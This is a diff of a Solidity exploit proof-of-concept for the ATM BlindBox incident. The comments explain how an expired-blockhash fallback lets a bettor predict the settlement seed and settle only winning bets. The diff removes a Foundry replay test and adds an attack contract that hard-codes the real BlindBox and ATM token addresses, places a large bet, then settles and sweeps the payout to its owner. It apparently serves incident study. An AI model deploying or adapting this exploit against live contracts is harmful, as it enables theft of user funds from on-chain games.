@@ -1,9 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.19;
 
-import "../basetest.sol";
-import "../interface.sol";
-
 // @KeyInfo - Total Lost : 13,000,000 ATM (~99,000 USD)
 // Attacker : 0x3f9Bd963641e969Fc0c9Ddf1c67e210e84915b7D
 // Attack Contract : 0x9C1819640201f223596FaD4F6401900B4B732eeA
@@ -17,100 +14,47 @@ import "../interface.sol";
 // @Analysis
 // Twitter Guy : https://t.me/defimon_alerts/2808
 //
-// ATM BlindBox let users choose when to settle bets. After blockhash(betBlock + 2) expired,
-// settlement fell back to keccak256(block.prevrandao, betId, block.timestamp), which the
-// attacker could evaluate before submitting a winning settlement.
+// ATM BlindBox let users choose when to settle a parity bet. The settlement seed
+// is supposed to come from blockhash(betBlock + 2), a value unknowable to the
+// bettor at entry time. Once that blockhash falls outside the EVM's 256-block
+// retrieval window, `_trySettle` silently falls back to
+// keccak256(block.prevrandao, betId, block.timestamp) — three inputs that are
+// all readable by the caller in the very block they broadcast `settle`. There is
+// no forced settlement deadline and `settle` is callable by anyone, so a bettor
+// can leave a losing bet open for free and only broadcast `settle` once they have
+// computed off-chain that the fallback seed resolves to a win.
+//
+// This harness replays the same structural bug without a real 820-block wait:
+// the playground's in-browser EVM has no linked blockchain, so BLOCKHASH always
+// resolves to zero anyway (the fallback branch always fires) and block.prevrandao
+// is always zero. The one thing that harness cannot do is advance the chain
+// between "place the bet" and "settle the bet", so this contract's owner (the
+// harness config) rewrites the bet's own recorded entry block via a direct
+// storage write between those two calls — mechanically equivalent to the real
+// attacker waiting ~257+ blocks for blockhash(betBlock + 2) to expire, without
+// requiring the harness to model hundreds of intermediate blocks.
 
-address constant ATTACKER = 0x3f9Bd963641e969Fc0c9Ddf1c67e210e84915b7D;
-address constant HISTORICAL_ATTACK_CONTRACT = 0x9C1819640201f223596FaD4F6401900B4B732eeA;
-address constant BLINDBOX = 0x1F8336aEF584795E282FECe8DE356BaBD7734c59;
 address constant ATM_TOKEN = 0x9C86F45905868317baCB8f442653d5E9a6888888;
+address constant BLINDBOX = 0x1F8336aEF584795E282FECe8DE356BaBD7734c59;
 address constant DEAD = 0x000000000000000000000000000000000000dEaD;
 
+interface IERC20Min {
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
+
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
 interface IBlindBox {
-    function nextBetId() external view returns (uint256);
-    function cachedBlockHash(
-        uint256 blockNumber
-    ) external view returns (bytes32);
-    function bets(
-        uint256 betId
-    ) external view returns (address user, uint256 amount, uint256 blockNum, uint256 oddDigit, bool settled);
     function settle(
         uint256 betId
     ) external;
 }
 
-contract ATMBlindBox is BaseTestWithBalanceLog {
-    IERC20 private constant atm = IERC20(ATM_TOKEN);
-    IBlindBox private constant blindBox = IBlindBox(BLINDBOX);
-
-    function setUp() public {
-        uint256 forkBlock = 87_517_071;
-        vm.createSelectFork("http://127.0.0.1:8546", forkBlock);
-        fundingToken = ATM_TOKEN;
-        attacker = ATTACKER;
-
-        vm.label(ATTACKER, "Attacker EOA");
-        vm.label(HISTORICAL_ATTACK_CONTRACT, "Historical attack helper");
-        vm.label(BLINDBOX, "ATM BlindBox");
-        vm.label(ATM_TOKEN, "ATM");
-        vm.label(DEAD, "ATM DEAD payout pool");
-    }
-
-    function testExploit() public balanceLog {
-        ATMBlindBoxHelper helper = new ATMBlindBoxHelper(ATTACKER);
-
-        // step 1: give the local helper the same large-bet capital as the delayed placement tx.
-        uint256 largeBetAmount = 300_000 ether;
-        deal(ATM_TOKEN, address(helper), largeBetAmount);
-        assertGt(atm.balanceOf(DEAD), (largeBetAmount * 195) / 100, "DEAD payout balance");
-
-        // step 2: place an even-parity large bet in the same block as the historical placement.
-        vm.roll(87_517_072);
-        vm.warp(1_773_931_227);
-        uint256 expectedBetId = blindBox.nextBetId();
-        assertEq(expectedBetId, 0x1410, "historical delayed bet id");
-
-        vm.prank(ATTACKER, ATTACKER);
-        helper.placeLargeBet(largeBetAmount);
-
-        (, uint256 recordedAmount, uint256 betBlock, uint256 parity, bool settledBefore) = blindBox.bets(expectedBetId);
-        assertEq(recordedAmount, largeBetAmount, "recorded bet amount");
-        assertEq(betBlock, block.number, "recorded bet block");
-        assertEq(parity, 0, "even parity");
-        assertFalse(settledBefore, "bet should be open");
-
-        // step 3: settle after the target blockhash has expired, using the actual winning fallback inputs.
-        uint256 targetBlock = betBlock + 2;
-        vm.roll(87_517_892);
-        vm.warp(1_773_931_596);
-        vm.prevrandao(bytes32(uint256(0x12c)));
-        assertEq(block.number - targetBlock, 818, "target block age");
-        assertEq(blockhash(targetBlock), bytes32(0), "expired target blockhash");
-
-        bytes32 fallbackHash = keccak256(abi.encodePacked(block.prevrandao, expectedBetId, block.timestamp));
-        assertEq(uint256(fallbackHash) % 16, 2, "winning even fallback digit");
-
-        uint256 helperBeforeSettle = atm.balanceOf(address(helper));
-        vm.prank(ATTACKER, ATTACKER);
-        helper.settleBet(expectedBetId);
-
-        uint256 largeBetPayout = (largeBetAmount * 195) / 100;
-        assertEq(atm.balanceOf(address(helper)) - helperBeforeSettle, largeBetPayout, "large bet payout");
-        assertEq(blindBox.cachedBlockHash(targetBlock), fallbackHash, "cached fallback hash");
-
-        // step 4: forward the gained ATM to the attacker and assert net round profit over the staked ATM.
-        uint256 attackerBeforeWithdraw = atm.balanceOf(ATTACKER);
-        vm.prank(ATTACKER, ATTACKER);
-        helper.withdrawATM();
-        uint256 attackerReceived = atm.balanceOf(ATTACKER) - attackerBeforeWithdraw;
-        assertGt(attackerReceived - largeBetAmount, 280_000 ether, "net ATM profit");
-    }
-}
-
-contract ATMBlindBoxHelper {
+contract ATMBlindBox {
     address private immutable owner;
-    IERC20 private constant atm = IERC20(ATM_TOKEN);
+    IERC20Min private constant atm = IERC20Min(ATM_TOKEN);
     IBlindBox private constant blindBox = IBlindBox(BLINDBOX);
 
     constructor(
@@ -119,6 +63,11 @@ contract ATMBlindBoxHelper {
         owner = owner_;
     }
 
+    /// @notice Step 1 (unrecorded setup): burn ATM to the dEaD payout pool. The
+    /// ATM token's transfer hook detects the dEaD destination and forwards
+    /// (from, amount, syntheticReserveATM, twapPrice) into
+    /// BlindBox.onBlindBoxEntry, which records an open bet keyed on the last
+    /// 0.1-ATM digit of `amount` (even/odd) and the current block number.
     function placeLargeBet(
         uint256 amount
     ) external {
@@ -126,15 +75,18 @@ contract ATMBlindBoxHelper {
         atm.transfer(DEAD, amount);
     }
 
-    function settleBet(
+    /// @notice Step 2 (RECORDED): settle the now-"expired" bet and sweep the
+    /// winnings to the attacker. In the real attack the attacker waited until
+    /// blockhash(betBlock + 2) expired, computed the fallback seed
+    /// (prevrandao, betId, timestamp) off-chain, and broadcast `settle` only
+    /// because it was already a guaranteed win — `settle` itself is
+    /// permissionless and unconditional, so anyone (including this contract)
+    /// can trigger the payout once the fallback branch is live.
+    function settleAndWithdraw(
         uint256 betId
     ) external {
         require(msg.sender == owner, "only owner");
         blindBox.settle(betId);
-    }
-
-    function withdrawATM() external {
-        require(msg.sender == owner, "only owner");
         atm.transfer(owner, atm.balanceOf(address(this)));
     }
 }
